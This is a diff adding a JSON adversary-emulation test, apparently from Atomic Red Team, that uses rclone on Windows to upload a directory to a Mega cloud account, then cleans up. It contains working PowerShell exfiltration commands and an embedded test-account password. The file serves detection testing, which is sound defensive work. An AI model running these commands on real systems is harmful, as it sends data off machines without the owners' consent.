@@ -1,0 +1,135 @@
+{
+  "id": "8529ee44-279a-4a19-80bf-b846a40dda58",
+  "name": "Exfiltrate data with rclone to cloud Storage - Mega (Windows)",
+  "description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "765bd64f-11f2-463d-aea1-c8e3d82101c7",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item #{rclone_config_path}\\rclone -ItemType directory\nNew-Item #{rclone_config_path}\\rclone\\rclone.conf\ncd \"#{rclone_path}\"\n.\\rclone.exe config create #{remote_share} mega\nset-Content #{rclone_config_path}\\rclone\\rclone.conf \"[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}\"\n.\\rclone.exe copy --max-size 1700k \"#{dir_to_copy}\" #{remote_share}:test -v\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1e3cbd44-c481-448c-b653-e8c338032d57",
+      "type": "execute-command",
+      "data": {
+        "command": "cd \"#{rclone_path}\"\n.\\rclone.exe purge #{remote_share}:test\n.\\rclone.exe config delete #{remote_share}:\nRemove-Item #{rclone_config_path}\\rclone -recurse -force -erroraction silentlycontinue\ncd c:\\\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\" -recurse -force\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b0653b03-f152-4aa1-ac44-c5ed946005ed",
+      "name": "Check dependency 1/1",
+      "description": "rclone must exist at (#{rclone_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{rclone_path}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6e04d405-cb51-4b12-baaa-ac174b3c058c",
+      "name": "Resolve dependency 1/1",
+      "description": "rclone must exist at (#{rclone_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\"\nExpand-archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\\" -force\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "3678d099-1cde-40eb-a616-7cfb4b29b61c",
+      "name": "Re-check dependency 1/1",
+      "description": "rclone must exist at (#{rclone_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{rclone_path}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "765bd64f-11f2-463d-aea1-c8e3d82101c7",
+      "p": "on-success",
+      "o": "1e3cbd44-c481-448c-b653-e8c338032d57"
+    },
+    {
+      "s": "765bd64f-11f2-463d-aea1-c8e3d82101c7",
+      "p": "on-failure",
+      "o": "1e3cbd44-c481-448c-b653-e8c338032d57"
+    },
+    {
+      "s": "b0653b03-f152-4aa1-ac44-c5ed946005ed",
+      "p": "on-success",
+      "o": "765bd64f-11f2-463d-aea1-c8e3d82101c7"
+    },
+    {
+      "s": "b0653b03-f152-4aa1-ac44-c5ed946005ed",
+      "p": "on-failure",
+      "o": "6e04d405-cb51-4b12-baaa-ac174b3c058c"
+    },
+    {
+      "s": "6e04d405-cb51-4b12-baaa-ac174b3c058c",
+      "p": "on-success",
+      "o": "3678d099-1cde-40eb-a616-7cfb4b29b61c"
+    },
+    {
+      "s": "3678d099-1cde-40eb-a616-7cfb4b29b61c",
+      "p": "on-failure",
+      "o": "765bd64f-11f2-463d-aea1-c8e3d82101c7"
+    }
+  ],
+  "tags": [
+    "T1567.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "dir_to_copy",
+      "type": "string",
+      "description": "Directory to copy",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002"
+    },
+    {
+      "name": "mega_user_account",
+      "type": "string",
+      "description": "Mega user account",
+      "value": "atomictesting@outlook.com"
+    },
+    {
+      "name": "mega_user_password",
+      "type": "string",
+      "description": "Mega user password",
+      "value": "vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA"
+    },
+    {
+      "name": "remote_share",
+      "type": "string",
+      "description": "Remote Mega share",
+      "value": "T1567002"
+    },
+    {
+      "name": "rclone_path",
+      "type": "path",
+      "description": "Directory of rclone.exe",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\"
+    },
+    {
+      "name": "rclone_config_path",
+      "type": "path",
+      "description": "Path to rclone's config file (default should be fine)",
+      "value": "$env:appdata"
+    }
+  ]
+}
